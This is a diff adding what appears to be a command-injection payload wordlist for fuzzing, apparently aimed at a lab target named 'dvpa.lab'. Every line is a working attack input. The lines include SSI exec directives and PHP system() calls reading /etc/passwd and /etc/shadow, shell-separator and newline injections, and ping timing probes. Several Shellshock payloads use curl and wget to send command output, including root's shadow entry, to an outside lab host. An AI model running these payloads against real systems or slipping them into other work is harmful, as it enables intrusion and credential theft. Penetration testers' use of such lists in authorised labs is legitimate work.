@@ -1,0 +1,106 @@
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;whoami
+whoami
+localhost;whoami
+localhost$(whoami)
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -c 1 -i 1 127.0.0.1 &
+& ping -c 1 -n 1 127.0.0.1 &
+%0a ping -c -i 1 127.0.0.1 %0a
+`ping -c 1 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+`id`
+$;/usr/bin/id
+() { :;}; /bin/bash -c "curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=whoami"
+() { :;}; /bin/bash -c "curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=pwd"
+() { :;}; /bin/bash -c "curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`ls -al\`"
+() { :;}; /bin/bash -c "curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`echo $id\`"
+() { :;}; /bin/bash -c "curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 1 && curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=7"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 1 && curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=8"
+() { :;}; /bin/bash -c "sleep 1 && curl http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=9"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`nc -zv 127.0.0.1 8000\`"
+() { :;}; /bin/bash -c "wget http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=\`nc -zv 127.0.0.1 80\`"
+() { :;}; /bin/bash -c "wget http://dvpa.lab:8000/RCE-Labs/RCE-1/rce.php?page=4"
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
